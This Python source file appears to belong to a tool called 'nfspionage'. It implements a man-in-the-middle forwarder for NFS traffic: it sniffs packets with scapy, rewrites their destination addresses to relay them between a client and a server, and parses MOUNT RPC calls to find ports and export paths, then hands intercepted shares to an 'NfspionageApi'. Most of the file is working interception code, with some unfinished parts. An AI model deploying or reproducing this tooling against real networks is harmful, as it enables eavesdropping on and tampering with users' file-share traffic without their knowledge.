import _thread
import socket

from nfspionage_api import NfspionageApi
from scapy.compat import raw
from scapy.contrib.mount import MOUNT_Call
from scapy.contrib.oncrpc import RPC
from scapy.layers.inet import IP, TCP, UDP
from scapy.sendrecv import sniff, send


# @PARAM
# packet        scapy       packet object
# protocol      string      TCP, UDP
# dir           int         0 - no, get dst
#                           1 - yes, get src
def print_ip_addr(packet, protocol=TCP, src=0):
    if src == 1:  # src
        res = packet[IP].src
    else:  # dst
        res = packet[IP].dst

    if protocol in packet:
        if src == 1:  # src
            res += ":" + str(packet[protocol].sport)
        else:  # dst
            res += ":" + str(packet[protocol].dport)
    return res


def protocol_str(protocol):
    if protocol == TCP:
        return "tcp"
    else:
        return "udp"


def print_packet_transfer(protocol, packet):
    print("[+ " + protocol_str(protocol).upper() + " ] " + print_ip_addr(packet, src=1) + " >>> " + print_ip_addr(packet) + " [" + str(len(packet)) + "]")


'''
# ==============================================================================
# MITM FORWARDER ===============================================================
# ==============================================================================
'''


class MitmForwarder:
    server_address = None
    target_port = None

    client_address = None
    mount_ports = []

    def __init__(self, remote_ip, port, udp=False):
        self.server_address = remote_ip
        self.target_port = port
        print("// ========================================")
        print("// Starting MitmForwarder...")
        print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
        print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
        if udp:
            print("// [*] PROT:\t\tUDP")
            self.packet_listen(UDP)
        else:
            print("// [*] PROT:\t\tTCP")
            self.packet_listen(TCP)
        print("// ========================================")

    def update_client_address(self, packet):
        if packet[IP].src is not self.server_address:
            self.client_address = packet[IP].src

    # ==================== PACKET FORWARDING ==================== #

    # create tcp servers to listen for and forward connections to target
    def packet_listen(self, protocol):
        # socket to actually accept connections on localhost:target_port
        if protocol == TCP:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print("[* INF ] starting " + protocol_str(protocol) + " socket on port " + str(self.target_port))
        server_socket.bind(('', self.target_port))

        packet_filter = protocol_str(protocol) + " and port " + str(self.target_port)
        if protocol == TCP:
            server_socket.listen(1)

        while True:  # each iteration will receive a packet and forward it appropriately
            packets = sniff(count=1, filter=packet_filter)
            print("=================================================")
            packet = packets.res[0]
            self.update_client_address(packet)
            print_packet_transfer(protocol, packet)
            print("server; " + self.server_address)
            print("client: " + self.client_address)
            datagram = packet[IP]
            if packet[IP].src != self.server_address:  # packet is NOT from server -> forward to target
                print("PACKET NOT FROM SERVER")
                datagram.dst = self.server_address
                # packet[IP].dst = self.server_address
                # TODO change src ip
                # packet[IP].src = client_address
                # packet[protocol].sport = client_sport
            else:  # packets is from server -> forward to client
                print("PACKET FROM SERVER")
                # self.filter_packets(str(packet), packet[IP].dst)
                # packet[IP].dst = self.client_address
                datagram.dst = self.client_address
            print_packet_transfer(protocol, datagram)  # print outgoing packet
            send(datagram)

    # ==================== PACKET FILTERING ==================== #

    # filter packets for data of interest - i.e., mount port and mount path
    def filter_packets(self, data, remote_ip):
        port = self.filter_mount_port(data)
        if port != -1 and port not in self.mount_ports:
            print("[* INF ] starting forwarders on port " + str(port))
            _thread.start_new_thread(MitmForwarder, (remote_ip, port))
            _thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
            self.mount_ports.append(port)

        # filter path, start mitm API
        path = self.filter_mount_path(data)
        if path != -1:
            print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
            _thread.start_new_thread(NfspionageApi, (remote_ip, path))

    @staticmethod
    def filter_mount_port(data):
        try:  # get port number from last few bytes
            sz = len(data)
            x = data[sz - 2:sz]
            tmp = x.hex()
            port = int(tmp, 16)

            if port != 0 and port > 100:
                print("[* INF ] MOUNT on port " + str(port))
                return port
            else:
                return -1
        except Exception as e:  # error getting mount port
            str("[- EXP ] " + str(e))
            return -1

    @staticmethod
    def filter_mount_path(data):
        try:  # try to convert to MOUNT_Call packet
            mnt_pckt = RPC(MOUNT_Call(raw(data)))
            path = mnt_pckt.path.path.decode('utf-8')
            print("[* INF ] MOUNT on path " + path)
            return path
        except Exception as e:  # error getting mount path
            print("[- EXP ] " + str(e))
            return -1

